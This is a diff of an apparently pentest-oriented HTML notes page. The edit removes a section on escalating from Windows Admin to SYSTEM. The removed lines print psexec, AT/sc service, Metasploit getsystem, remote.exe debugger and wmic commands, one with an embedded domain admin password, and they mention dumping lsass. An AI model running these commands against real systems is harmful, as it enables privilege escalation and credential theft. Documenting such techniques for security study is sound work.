@@ -11,40 +11,4 @@ Create/Start service<br/>
 msf payload<br/>
 <br/>
 <br/>
-If you are Admin, you can escalate to SYSTEM using various methods:<br/>
-<br/>
-psexec.exe -i -s -d cmd.exe<br/>
-<br/>
-<br/>
-The cool thing about AT jobs and scheduled tasks is that if you run them as "admin" they really get run as SYSTEM, so you can do neat stuff like dump lsass memory or get SYSTEM shells when the job executes your binary.<br/>
-#Get current time<br/>
-net use \\targetserver /user:DOM\user pass<br/>
-net time \\targetserver<br/>
-AT \\targetserver 12:00 /interactive cmd.exe &nbsp;<br/>
-<br/>
-Schtasks<br/>
-C:\sc create RunCMDAsLSA binpath= "cmd /k &lt;cmd&gt;" type= own type= interact<br/>
-C:\sc start RunCMDAsLSA<br/>
-<br/>
-<br/>
-Metasploit<br/>
-getsystem -t 1<br/>
-Note: This requires a meterpreter session<br/>
-<br/>
-<br/>
-Binary replacement<br/>
-1. stop service<br/>
-2. replace binary<br/>
-3. start service<br/>
-<br/>
-<br/>
-wmic<br/>
-smic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create "cmd /c vssadmin list shadows 2&gt;&amp;1 &gt; C:\temp\output.txt"<br/>
-<br/>
-<br/>
-<a href="http://carnal0wnage.attackresearch.com/2013/07/admin-to-system-win7-with-remoteexe.html">debugging cmd.exe</a><br/>
-#start the debugging<br/>
-at 13:37 C:\debuggers\remote.exe /s cmd SYSCMD<br/>
-#connect to the debugger<br/>
-C:\debuggers\remote.exe /c 127.0.0.1 SYSCMD<br/>
-#NTSD can be used for this as well</body></html>
+If you are Admin, you can escalate to SYSTEM using various methods</body></html>
